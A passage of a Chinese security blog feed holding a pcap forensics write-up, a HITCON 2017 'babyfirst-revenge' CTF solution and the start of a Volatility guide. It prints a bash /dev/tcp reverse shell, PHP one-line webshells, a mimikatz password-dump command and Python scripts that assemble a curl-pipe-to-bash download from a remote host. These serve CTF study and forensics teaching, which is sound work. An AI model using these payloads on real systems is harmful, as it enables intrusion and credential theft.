class="hljs-number">3</span>D\<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/16.png" alt="16"></p><p>很明显黑客查看了网站的配置文件。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$myd</span>bhost=<span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-symbol">$myd</span>buser=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-symbol">$myd</span>bpw  =<span class="hljs-string">&quot;windpasssql&quot;</span>;<br><span class="hljs-symbol">$myd</span>bname=<span class="hljs-string">&quot;510cms&quot;</span>;<br></code></pre></td></tr></table></figure><p>再根据第二台主机上开放<code>6379</code>端口，模式运行<code>redis</code>服务，黑客有可能是在第一台<code>windows</code>主机上使用<code>regeorg</code>作为代理，连接到数据库写马。</p><p>但是过滤<code>tcp</code>流量没有发现。</p><p>打开第五个数据包。</p><p>直接过滤<code>tcp.port == 6379</code>，随便选一个直接<code>follow</code></p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/17.png" alt="17"></p><p>可以找到黑客利用redis反弹了一个shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">202.1.1.2</span>/<span class="hljs-number">6666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>反弹到了自己的<code>6666</code>端口上。</p><p>说明后面黑客执行的命令走的是tcp的6666端口。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">tcp.port</span> == <span class="hljs-number">6666</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">66</span><br></code></pre></td></tr></table></figure><p>直接过滤，follow一下</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/18.png" alt="18"></p><p>可以看到黑客拥有了有个root的shell<br>可知主机名为<code>cloude</code><br>黑客执行的第二条命令是<code>cd /var/www/html</code><br>黑客写入了一个一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[a]);&#x27;</span>&gt;indexs.php<br></code></pre></td></tr></table></figure><p>在第六个数据包</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">tcp</span> contains <span class="hljs-string">&quot;root&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">66</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/19.png" alt="19"></p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/20.png" alt="20"></p><p>可找到MD5<code>bab0e4bb1cd7738880b97d0ca3b313f6</code>,解密可得<code>112233.com </code></p><p>即用户密码为</p><p>admin/112233.com `</p><p>无偿ARP的特征<br><code>arp &amp;&amp; arp.isgratuitous == true</code><br>从第一个数据包开始挨个过滤查看</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/21.png" alt="21"><br>答案是</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.3.213</span><br><span class="hljs-number">192.168.3.6</span><br><span class="hljs-number">192.168.3.19</span><br></code></pre></td></tr></table></figure><h2 id="4-最后答案"><a href="#4-最后答案" class="headerlink" title="4.最后答案"></a>4.最后答案</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">1</span>.被攻击的两个服务器的内网ip分别是多少，以下简称服务器<span class="hljs-number">1</span>和<span class="hljs-number">2</span>(格式：空格分隔，按黑客攻击顺序排列）  <br><span class="hljs-number">192.168.1.74</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">66</span><br><span class="hljs-number">2</span>.两台服务器的主机名分别是什么？<br><span class="hljs-number">192.168.1.74</span> TEST-7E28AF8836<br><span class="hljs-number">192.168.2.66</span> cloude<br><span class="hljs-number">3</span>.黑客使用了什么工具对服务器<span class="hljs-number">1</span>进行的攻击(小写)<br>sqlmap  <br><span class="hljs-number">4</span>.黑容成功登陆网站后台的账号密码以及验证码是什么(格式user/pass/vcode)  <br>admin/adminlwphp/WD7x<br><span class="hljs-number">5</span>.黑客向服务器<span class="hljs-number">1</span>写入webshell的具体命令是什么(url解码后)<br>echo ^&lt;?php^ eval($_POST<span class="hljs-string">[ge]</span>);?^&gt;&gt;abc.php<br><span class="hljs-number">6</span>.服务器<span class="hljs-number">1</span>都开启了哪些允许外连的TCP注册端口(端口号从小到大，用空格间隔) <br><span class="hljs-number">1025</span> <span class="hljs-number">3306</span> <span class="hljs-number">3389</span><br><span class="hljs-number">7</span>.服务器<span class="hljs-number">1</span>安装的修补程序名称<br>Q147222<br><span class="hljs-number">8</span>.网站根目录的绝对路径(注意：大写，左斜杠，最后要有一个斜杠)  <br>C:/WWW/<br><span class="hljs-number">9</span>.黑客使用什么命令或文件进行的内网扫描 <br>scan.php <br><span class="hljs-number">10</span>.扫描结果中服务器<span class="hljs-number">2</span>开放了哪些端口(端口号从小到大，用空格隔开)  <br><span class="hljs-number">11</span>.黑客执行的什么命令将administrator的密码保存到文件中 <br>cd /d <span class="hljs-string">&quot;C:\WWW\my\mimi\&quot;</span>&amp;mimikatz.exe <span class="hljs-string">&quot;&quot;</span>privilege::debug<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="hljs-string">&quot;&quot;</span> exit &gt;&gt; log.txt&amp;echo <span class="hljs-string">[S]</span>&amp;cd&amp;echo <span class="hljs-string">[E]</span><br><span class="hljs-number">12</span>.服务器<span class="hljs-number">1</span>的系统管理员administrator的密码是什么<br>Simplexue123<br><span class="hljs-number">13</span>.黑客进行内外扫描的ip范围(格式:xx.xx.xx.xx~xx.xx.xx.xx)<br><span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">255</span><br><span class="hljs-number">14</span>.服务器<span class="hljs-number">1</span>的mysql的root用户的密码是什么  <br>windpasssql<br><span class="hljs-number">15</span>.黑客在服务器<span class="hljs-number">2</span>中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径  <br>/etc/shadow<br><span class="hljs-number">16</span>.服务器<span class="hljs-number">2</span>的web网站后台账号密码(格式:账号/密码) <br>admin/<span class="hljs-number">112233</span>.com <br><span class="hljs-number">17</span>.黑客在redis未授权访问中反弹shell的ip和端口是多少<br><span class="hljs-number">202.1.1.2</span>/<span class="hljs-number">6666</span> <br><span class="hljs-number">18</span>.黑客拿到root权限后执行的第二条命令是什么<br>cd /var/www/html<br><span class="hljs-number">19</span>.服务器<span class="hljs-number">2</span>的root用户密码是什么  <br>Simplexue123<br><span class="hljs-number">20</span>.黑客向服务器<span class="hljs-number">2</span>写入webshell的命令<br>echo &#x27;&lt;?php eval($_POST<span class="hljs-string">[a]</span>);&#x27;&gt;indexs.php<br><span class="hljs-number">21</span>.pcap中哪些ip发送过无偿ARP包(空格分隔，时间顺序排序)<br><span class="hljs-number">192.168.3.213</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">6</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">19</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据包分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON-2017-babyfirst-revenge-v1&amp;v2 复现</title>
    <link href="/2018/10/31/HITCON-2017-babyfirst-revenge-v1-v2/"/>
    <url>/2018/10/31/HITCON-2017-babyfirst-revenge-v1-v2/</url>
    
    <content type="html"><![CDATA[<p>i春秋CTF训练营 HITCON CTF 2017 的Web题 babyfirst-revenge 和 babyfirst-revenge v2 复现。</p><a id="more"></a><h2 id="1-babyfirst-revenge"><a href="#1-babyfirst-revenge" class="headerlink" title="1. babyfirst-revenge"></a>1. babyfirst-revenge</h2><h3 id="1-1-题目代码"><a href="#1-1-题目代码" class="headerlink" title="1.1 题目代码"></a>1.1 题目代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    @mkdir(<span class="hljs-variable">$sandbox</span>);<br>    @chdir(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &lt;= <span class="hljs-number">5</span>) &#123;<br>        @exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        @exec(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>题目使用<code>sandbox</code>给每个访问题目的用户提供了一个单独的环境，能执行长度小于等于5的命令，看起来目的就是<code>getshell</code>。</p><h3 id="1-2-题解"><a href="#1-2-题解" class="headerlink" title="1.2 题解"></a>1.2 题解</h3><p>在本题中，执行命令的长度被限制到了5个字符，直接执行命令也没有回显，因此得想办法写一个php马或者反弹一个shell出来。</p><p>Linux的Trick：</p><ol><li>命令能够使用<code>\</code>来换行续写。</li><li>文件中当前命令错误不会影响后续命令的执行。</li></ol><p>如图所示：</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/1.png" alt="1"></p><p>第3行<code>asd</code>并不是一个命令，脚本虽然报错了，但后面的<code>echo</code>语句还是正常执行了，而且在第4行末尾，添加了一个<code>\</code>,脚本自动将其与第5行连接，并且执行了<code>echo &quot;Go on&quot;</code>命令。</p><p>因此有了一个思路，将所要执行的命令分解成片段并作为文件名，在命令片段末尾添加<code>\</code>最后使用<code>ls&gt;x</code>将其输出到文件<code>x</code>中。</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/2.png" alt="2"></p><p>如图所示，<code>date</code>命令成功执行了。</p><p>但是还有一个问题，我们都知道，<code>ls</code>的命令结果默认是以字典序进行排序的，到最后很难构造出要执行的命令，不过<code>ls</code>有个<code>-t</code>参数，来将文件基于时间排序，越晚创建的，越排在前面。</p><blockquote><p>-t     sort by modification time, newest first</p></blockquote><p>因此我们可以构造命令<code>ls -t&gt;b</code>。这样就能按照时间顺序将命令存储到文件中。接下来构造这个命令。</p><p>该命令长7个字符，分割命令，每次执行命令的最大长度是5，除去<code>&gt;</code>和<code>\</code>，最多一部分3个字符。</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/3.png" alt="3"></p><p>可以看到，通过两次<code>ls</code>拼接，第4-7行组成了命令<code>ls -t&gt;b</code>。</p><p>接下来就是相同的套路，来构造一个<code>curl</code>请求，将VPS上的存有命令的文件下载下来，然后执行即可。</p><h3 id="1-3-执行脚本"><a href="#1-3-执行脚本" class="headerlink" title="1.3 执行脚本"></a>1.3 执行脚本</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://117.50.3.97:8001/index.php&quot;</span><br><br>payload <span class="hljs-operator">=</span> [<br><span class="hljs-string">&quot;&gt;-t<span class="hljs-subst">\\</span>&quot;</span>, # ls <span class="hljs-operator">-</span>t<span class="hljs-operator">&gt;</span>b<br><span class="hljs-string">&quot;&gt;\&gt;b&quot;</span>,<br><span class="hljs-string">&quot;&gt;l<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;s\ <span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;ls&gt;a&quot;</span>,<br><span class="hljs-string">&quot;ls&gt;&gt;a&quot;</span>,<br><span class="hljs-string">&quot;&gt;bash&quot;</span>, # <span class="hljs-type">Download</span> <span class="hljs-type">Payload</span><br><span class="hljs-string">&quot;&gt;8\|<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;15<span class="hljs-subst">\\</span>&quot;</span>, <br><span class="hljs-string">&quot;&gt;31.<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;99.<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;9.1<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;13<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;\ <span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;rl<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;cu<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;sh a&quot;</span>,<br><span class="hljs-string">&quot;sh b&quot;</span>,<br>]<br>r <span class="hljs-operator">=</span> requests.get(url<span class="hljs-operator">+</span><span class="hljs-string">&quot;?reset=1&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>print i<br>time.sleep(<span class="hljs-number">0.5</span>)<br>r <span class="hljs-operator">=</span> requests.get(url <span class="hljs-operator">+</span> <span class="hljs-string">&quot;?cmd=&quot;</span> <span class="hljs-operator">+</span> i)<br></code></pre></td></tr></table></figure><p>在VPS上放个bash反弹shell的命令，然后直接在VPS上监听对应的端口，脚本执行完毕后即可获得shell。</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/4.png" alt="4"></p><p>在<code>home</code>目录中，找到<code>fl4444g</code>目录，在README文档中，找到提示，flag在数据库中。</p><p>在shell中，不能直接使用mysql连接数据库进行交互，可以使用<code>-e</code>参数来执行SQL语句。来一个三连XD</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> -ufl<span class="hljs-number">4444</span>g -pSugZXUtgeJ<span class="hljs-number">52</span>_Bvr -e <span class="hljs-string">&quot;show databases;&quot;</span> &gt; database.txt<br><span class="hljs-attribute">mysql</span> -ufl<span class="hljs-number">4444</span>g -pSugZXUtgeJ<span class="hljs-number">52</span>_Bvr -e <span class="hljs-string">&quot;use fl4gdb;show tables;&quot;</span> &gt; <span class="hljs-number">1</span>.txt<br><span class="hljs-attribute">mysql</span> -ufl<span class="hljs-number">4444</span>g -pSugZXUtgeJ<span class="hljs-number">52</span>_Bvr -e <span class="hljs-string">&quot;use fl4gdb;select * from this_is_the_fl4g;&quot;</span> &gt; <span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/5.png" alt="5"></p><h2 id="2-babyfirst-revengev2"><a href="#2-babyfirst-revengev2" class="headerlink" title="2. babyfirst-revengev2"></a>2. babyfirst-revengev2</h2><h3 id="2-1-题目代码"><a href="#2-1-题目代码" class="headerlink" title="2.1 题目代码"></a>2.1 题目代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    @mkdir(<span class="hljs-variable">$sandbox</span>);<br>    @chdir(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &lt;= <span class="hljs-number">4</span>) &#123;<br>        @exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        @exec(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>与第一个题目的差别不大，就是命令执行的字符长度更短了，最大长度变成了4个字符。</p><h3 id="2-2-题解"><a href="#2-2-题解" class="headerlink" title="2.2 题解"></a>2.2 题解</h3><p>与第一题思路类似，得想办法构造<code>ls -t&gt;b</code>命令。但是第一题中使用了<code>ls&gt;&gt;a</code>命令，在这个题中就不能用了。</p><p>这里需要linux的另一个小tricks。</p><p>在linux的shell中，我们一般使用<code>*</code>作为通配符使用。如图所示：</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/6.png" alt="6"></p><p>在目录中单独一个<code>*</code>，linux会把当前目录下的所有文件名按照字典序排序，然后作为命令执行，图中就成功执行了命令<code>echo zxc</code>。</p><p>因为字符限制为4，<code>ls&gt;&gt;?</code>命令不能使用了，可以使用<code>rev</code>命令进行逆序。<code>ls -t&gt;g</code>这个命令逆序也不能实现，因为<code>t</code>在字典序中是比<code>s</code>大。如果是逆序的话，需要一个比<code>s</code>小的字母。在<code>ls</code>中有个参数<code>-h</code>，它与<code>-l</code>一起使用，使输出更加具有可读性。与其他参数一起则没有影响。因此可以构造<code>ls -th&gt;g</code></p><blockquote><p>-h, –human-readable<br>​              with -l, print sizes in human readable format (e.g., 1K 234M 2G)</p></blockquote><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/7.png" alt="7"></p><p>而且在一般linux系统中，<code>ls</code>命令一般有一个别名<code>dir</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">dir</span><br><span class="hljs-meta">&gt;</span><span class="bash">sl</span><br><span class="hljs-meta">&gt;</span><span class="bash">g\&gt;</span><br><span class="hljs-meta">&gt;</span><span class="bash">ht-</span><br></code></pre></td></tr></table></figure><p>这样执行的话，直接执行一个<code>*</code>，相当于执行<code>dir g&gt; ht- sl</code>。</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/8.png" alt="8"></p><p>再想办法将其逆序就好了，使用<code>rev</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">v</span><br><span class="hljs-meta">&gt;</span><span class="bash">rev</span><br>*v&gt;x<br></code></pre></td></tr></table></figure><p>当目录中存在<code>rev</code>和<code>v</code>两个文件时，使用<code>*v</code>相当于<code>rev v</code>，也就是对<code>v</code>的内容进行逆序。然后<code>&gt;x</code>将内容输出到<code>x</code>文件中。</p><p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/9.png" alt="9"></p><p>由此成功构造出命令<code>ls -th&gt;g</code>命令。后面的curl VPS上的命令就与第一题没什么区别了，IP也可以转换成10进制来绕过<code>.</code>的限制。</p><h3 id="2-3-执行脚本"><a href="#2-3-执行脚本" class="headerlink" title="2.3 执行脚本"></a>2.3 执行脚本</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://117.50.3.97:8002/index.php&quot;</span><br><br>payload <span class="hljs-operator">=</span> [<br><span class="hljs-string">&quot;&gt;dir&quot;</span>,<br><span class="hljs-string">&quot;&gt;sl&quot;</span>, <br><span class="hljs-string">&quot;&gt;g\&gt;&quot;</span>,  <br><span class="hljs-string">&quot;&gt;ht-&quot;</span>,<br><span class="hljs-string">&quot;*&gt;v&quot;</span>,<br><span class="hljs-string">&quot;&gt;rev&quot;</span>,<br><span class="hljs-string">&quot;*v&gt;x&quot;</span>, # ls <span class="hljs-operator">-</span>th<span class="hljs-operator">&gt;</span>g<br><span class="hljs-string">&quot;&gt;sh&quot;</span>,<br><span class="hljs-string">&quot;&gt;ba<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;\|<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;32<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;1<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;9.<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;2<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;8.<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;16<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;4.<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;10<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;\ <span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;rl<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;&gt;cu<span class="hljs-subst">\\</span>&quot;</span>,<br><span class="hljs-string">&quot;sh x&quot;</span>,<br><span class="hljs-string">&quot;sh g&quot;</span><br>]<br>r <span class="hljs-operator">=</span> requests.get(url<span class="hljs-operator">+</span><span class="hljs-string">&quot;?reset=1&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>print i<br>time.sleep(<span class="hljs-number">0.5</span>)<br>r <span class="hljs-operator">=</span> requests.get(url <span class="hljs-operator">+</span> <span class="hljs-string">&quot;?cmd=&quot;</span> <span class="hljs-operator">+</span> i)<br></code></pre></td></tr></table></figure><p>拿shell找flag就不再赘述了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Volatility解决CTF取证类题目</title>
    <link href="/2018/10/20/CTF-Volatility/"/>
    <url>/2018/10/20/CTF-Volatility/</url>
    
    <content type="html"><![CDATA[<p>这段时间做CTF遇到了个内存取证的题目，由于工具用的不熟练，最后没及时做出来，赛后整理整理Volatility的常用命令。</p><a id="more"></a><h2 id="1-Volatility-常用命令"><a href="#1-Volatility-常用命令" class="headerlink" title="1. Volatility 常用命令"></a>1. Volatility 常用命令</h2><h3 id="1-1-imageinfo"><a href="#1-1-imageinfo" class="headerlink" title="1.1 imageinfo"></a>1.1 imageinfo</h3><p>通过这个命令来获取内存镜像的摘要信息，比如OS，Service Pack和硬件架构等，个人认为这个命令最主要的作用是给进一步分析指明<code>profile</code>，也就是使用其他插件时加载的配置文件。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">volatility</span> -f easy_dump.img imageinfo<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/1.png" alt="1"></p><p>可以使用<code>--info</code>参数来查看Volatiliity已经添加的profile和插件等信息。</p><p><img src="https://image.mengsec.com/CTF-Volatility/2.png" alt="2"></p><h3 id="1-2-kdbgscan"><a href="#1-2-kdbgscan" class="headerlink" title="1.2 kdbgscan"></a>1.2 